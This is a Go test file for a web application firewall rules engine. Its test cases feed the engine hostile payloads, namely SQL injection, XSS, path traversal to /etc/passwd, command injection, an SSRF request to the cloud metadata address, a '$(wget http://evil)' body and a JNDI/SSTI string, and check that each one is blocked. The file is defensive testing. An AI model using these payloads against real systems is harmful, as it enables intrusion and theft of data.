package rules

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"testing"
)

func TestOWASPBlocks(t *testing.T) {
	e := NewOWASP()
	cases := []struct {
		name string
		path string
		want string
	}{
		{"sqli", "/search?q=%27+OR+1%3D1--", "era-waf-sqli"},
		{"xss", "/page?x=%3Cscript%3Ealert(1)%3C/script%3E", "era-waf-xss"},
		{"traversal", "/files?f=..%2F..%2F..%2Fetc%2Fpasswd", "era-waf-path-traversal"},
		{"cmdi", "/run?cmd=%3B+cat+%2Fetc%2Fpasswd", "era-waf-cmdi"},
		{"ssrf", "/fetch?url=http://169.254.169.254/", "era-waf-ssrf"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodGet, "http://example.com"+tc.path, nil)
			m, ok := e.Evaluate(req)
			if !ok {
				t.Fatal("expected block")
			}
			if m.RuleID != tc.want {
				t.Fatalf("got %s want %s", m.RuleID, tc.want)
			}
		})
	}
}

func TestBenignAllowed(t *testing.T) {
	e := NewOWASP()
	req := httptest.NewRequest(http.MethodGet, "/healthz", nil)
	if _, ok := e.Evaluate(req); ok {
		t.Fatal("benign request blocked")
	}
}

func TestGoldenPackEvaluate(t *testing.T) {
	e := &Engine{}
	path := filepath.Join("testdata", "rules.pack.json")
	if err := e.LoadFile(path); err != nil {
		t.Fatal(err)
	}
	req := httptest.NewRequest(http.MethodGet, "http://x/search?q=%27+OR+select+", nil)
	m, ok := e.Evaluate(req)
	if !ok || m.RuleID != "era-waf-sqli" {
		t.Fatalf("got %+v ok=%v", m, ok)
	}
	got, _ := json.Marshal(e.Rules())
	wantPath := filepath.Join("testdata", "rules.list.golden.json")
	want, err := os.ReadFile(wantPath)
	if err != nil {
		t.Fatal(err)
	}
	if string(got) != string(want) {
		// compare structurally
		var a, b any
		_ = json.Unmarshal(got, &a)
		_ = json.Unmarshal(want, &b)
		ag, _ := json.Marshal(a)
		bg, _ := json.Marshal(b)
		if string(ag) != string(bg) {
			t.Fatalf("rules golden mismatch\ngot  %s\nwant %s", ag, bg)
		}
	}
}

func TestBodyInspectAndCRSLite(t *testing.T) {
	e := NewOWASP()
	req := httptest.NewRequest(http.MethodPost, "http://example.com/api", nil)
	m, ok := e.EvaluateWithBody(req, `payload=$(wget http://evil) /etc/passwd`)
	if !ok || m.RuleID != "era-waf-crs-rce" {
		t.Fatalf("got %+v ok=%v", m, ok)
	}
	req2 := httptest.NewRequest(http.MethodPost, "http://example.com/render", nil)
	m2, ok2 := e.EvaluateWithBody(req2, `{{7*7}}${jndi:ldap://x}`)
	if !ok2 || m2.RuleID != "era-waf-crs-ssti" {
		t.Fatalf("ssti %+v ok=%v", m2, ok2)
	}
}
